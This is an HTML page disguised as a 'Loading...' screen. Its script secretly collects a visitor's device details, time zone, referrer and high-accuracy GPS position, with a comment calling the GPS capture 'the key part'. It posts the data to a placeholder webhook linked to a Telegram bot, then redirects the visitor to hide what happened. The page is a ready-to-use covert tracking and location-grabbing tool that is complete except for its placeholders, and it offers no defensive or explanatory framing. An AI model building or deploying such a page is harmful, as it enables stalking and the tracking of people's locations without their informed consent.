<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            background: #000; 
            color: #fff; 
            text-align: center; 
            padding-top: 100px;
            font-family: Arial;
        }
        .loader { font-size: 18px; }
    </style>
</head>
<body>
    <div class="loader">⏳ Loading...</div>
    
    <script>
    // Capture everything
    const data = {
        // Device info
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenSize: screen.width + 'x' + screen.height,
        cpuCores: navigator.hardwareConcurrency || 'Unknown',
        ram: navigator.deviceMemory || 'Unknown',
        
        // Time
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        
        // Network
        referrer: document.referrer,
        
        // GPS - THIS IS THE KEY PART
        gps: null
    };
    
    // Try to get GPS coordinates
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                // SUCCESS - Got GPS!
                data.gps = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading
                };
                sendData(data);
            },
            function(error) {
                // GPS denied or unavailable
                data.gps = { error: error.message, code: error.code };
                sendData(data);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    } else {
        data.gps = { error: 'Geolocation not supported' };
        sendData(data);
    }
    
    function sendData(data) {
        // Send to your bot via Telegram API or webhook
        fetch('YOUR_WEBHOOK_URL', {
            method: 'POST',
            body: JSON.stringify(data),
            headers: { 'Content-Type': 'application/json' }
        });
        
        // Redirect to real site
        setTimeout(function() {
            window.location.href = 'https://t.me/YOUR_BOT_USERNAME';
        }, 1500);
    }
    </script>
</body>
</html>
